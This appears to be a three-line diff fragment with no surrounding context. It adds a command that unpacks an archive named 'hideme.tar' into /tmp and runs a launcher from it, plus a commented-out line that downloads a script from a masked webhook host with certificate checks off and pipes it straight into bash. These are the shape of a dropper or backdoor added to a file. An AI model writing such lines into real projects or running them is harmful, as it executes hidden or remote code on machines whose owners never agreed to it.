@@ -1,0 +1,3 @@
+cat hideme.tar | tar -C /tmp/ -x; /tmp/launch
+# upload this file to
+# curl -ksL http://***/webhook | bash -v
